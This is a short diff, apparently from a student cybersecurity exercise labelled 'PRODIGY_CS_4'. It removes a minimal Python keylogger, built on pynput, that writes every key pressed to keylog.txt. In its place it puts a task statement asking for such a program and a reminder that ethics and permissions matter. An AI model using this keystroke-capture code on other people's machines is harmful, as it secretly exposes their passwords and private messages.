@@ -1,12 +1,5 @@
-#BASIC KEYLOGGER
+PRODIGY_CS_4
 
-from pynput.keyboard import Listener
+Create a basic keylogger program that records and logs keystrokes . Focus on logging the keys pressed and saving them to a file . 
 
-log_file = "keylog.txt"
-
-def on_press(key):
-    with open(log_file, "a") as f:
-        f.write(f"{key}\n")
-
-with Listener(on_press=on_press) as listener:
-    listener.join()
+note: Ethical considerations and permissions are crucial for projects involving keyloggers.
